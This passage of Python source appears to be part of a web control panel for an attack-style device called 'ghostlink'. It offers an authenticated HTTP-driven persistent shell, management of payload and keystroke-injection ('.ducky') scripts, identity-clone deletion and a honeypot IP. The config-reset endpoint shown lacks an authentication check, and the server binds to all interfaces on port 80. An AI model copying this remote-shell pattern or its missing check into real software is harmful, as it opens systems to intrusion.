        # The shell is a real `sh` child that stays alive between requests, so
        # cd / exports / variables / loops survive like a terminal. The POST
        # writes the command to the shell's pty master and reads back until
        # the end-of-command sentinel appears (or 15 s elapses).
        if u.path == "/api/cli/exec":
            if not self._require_auth(): return
            tok = self._session_key()
            if not tok:
                return self._send_json({"ok": False, "err": "no session"}, code=401)
            try: data = json.loads(body)
            except Exception: data = {}
            cmd = data.get("cmd") or ""
            if not cmd.strip():
                return self._send_json({"ok": False, "err": "empty cmd"}, code=400)
            if len(cmd) > 8 * 1024:
                return self._send_json({"ok": False, "err": "cmd too long"}, code=413)
            try:
                r = pty_run(tok, cmd, timeout=15.0)
                return self._send_json({
                    "ok":  not r.get("timeout"),
                    "rc":  r.get("rc", -1),
                    "out": r.get("out", ""),
                    "err": r.get("err", ""),
                    "timeout": r.get("timeout", False),
                })
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- CLI session reset: kill the shell and start a fresh one -----
        if u.path == "/api/cli/reset":
            if not self._require_auth(): return
            tok = self._cookie_token()
            pty_close(tok)
            pty_open(tok)
            return self._send_json({"ok": True})

        # ---- CLI raw stdin: write arbitrary bytes to the pty master ------
        # xterm.js sends every keystroke (including special sequences for
        # arrows / ctrl-c / tab / enter) here. Body is UTF-8 encoded raw
        # pty input. No prompt wrapping — the shell handles echo.
        if u.path == "/api/cli/input":
            if not self._require_auth(): return
            tok = self._session_key()
            if not tok:
                return self._send_json({"ok": False, "err": "no session"}, code=401)
            s = pty_open(tok)
            try:
                os.write(s["fd"], body)
                return self._send_json({"ok": True})
            except OSError as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- CLI pty resize (xterm.js reports new rows/cols on resize) ---
        if u.path == "/api/cli/resize":
            if not self._require_auth(): return
            tok = self._session_key()
            if not tok:
                return self._send_json({"ok": False, "err": "no session"}, code=401)
            try: data = json.loads(body)
            except Exception: data = {}
            rows = int(data.get("rows", 24))
            cols = int(data.get("cols", 80))
            s = pty_open(tok)
            try:
                fcntl.ioctl(s["fd"], termios.TIOCSWINSZ,
                            struct.pack("HHHH", rows, cols, 0, 0))
                return self._send_json({"ok": True})
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- reset config.txt to canonical defaults ----------------------
        if u.path == "/api/config/defaults":
            try:
                tmp = CFG_PATH.with_suffix(".new")
                tmp.write_text(DEFAULT_CONFIG, encoding="utf-8")
                tmp.replace(CFG_PATH)
                try: subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "reload-dnsmasq"],
                                    timeout=5, capture_output=True)
                except Exception: pass
                return self._send_json({"ok": True})
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        self._send(404, "text/plain", "not found\n")

    def do_DELETE(self):
        if self._maybe_redirect(): return
        u = urlparse(self.path)
        if u.path.startswith("/api/scripts/"):
            name = u.path[len("/api/scripts/"):]
            if not SCRIPT_NAME_RE.match(name):
                return self._send_json({"ok": False, "err": "bad name"}, code=400)
            fp = PAY_DIR / name
            if not fp.exists():
                return self._send_json({"ok": False, "err": "not found"}, code=404)
            try: fp.unlink(); return self._send_json({"ok": True})
            except Exception as e: return self._send_json({"ok": False, "err": str(e)}, code=500)
        if u.path.startswith("/api/extensions/"):
            name = u.path[len("/api/extensions/"):]
            if not re.match(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$", name):
                return self._send_json({"ok": False, "err": "bad name"}, code=400)
            fp = EXT_DIR / f"{name}.ducky"
            if not fp.exists():
                return self._send_json({"ok": False, "err": "not found"}, code=404)
            try: fp.unlink(); return self._send_json({"ok": True})
            except Exception as e: return self._send_json({"ok": False, "err": str(e)}, code=500)
        if u.path == "/api/clone/identity":
            try:
                if ID_ENV.exists(): ID_ENV.unlink()
                return self._send_json({"ok": True})
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)
        self._send(404, "text/plain", "not found\n")


class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def main():
    cfg = load_cfg()
    try: port = int(cfg.get("WEBUI_PORT","80"))
    except (TypeError, ValueError): port = 80
    bind = cfg.get("WEBUI_BIND","0.0.0.0") or "0.0.0.0"
    # Retry bind up to 10x with 1 s gaps — handles the race where a prior
    # webui.py has JUST exited but the socket isn't released yet, and
    # yields cleanly if a duplicate webui is actually alive (so we don't
    # dump a traceback into the shared log).
    s = None
    for i in range(10):
        try:
            s = Server((bind, port), Handler); break
        except OSError as e:
            if e.errno == 98:    # EADDRINUSE
                sys.stderr.write(f"webui: :{port} busy, retry {i+1}/10\n")
                time.sleep(1)
                continue
            raise
    if s is None:
        sys.stderr.write(f"webui: giving up on {bind}:{port}, another instance owns it\n")
        return
    sys.stderr.write(f"webui listening {bind}:{port}\n")
    # Apply honeypot IP at startup so the secondary address survives a
    # webui restart without the admin having to toggle in the UI.
    try: _honeypot_apply_ip(cfg)
    except Exception: pass
    try:
        s.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        try: s.server_close()
        except Exception: pass


if __name__ == "__main__":
    main()
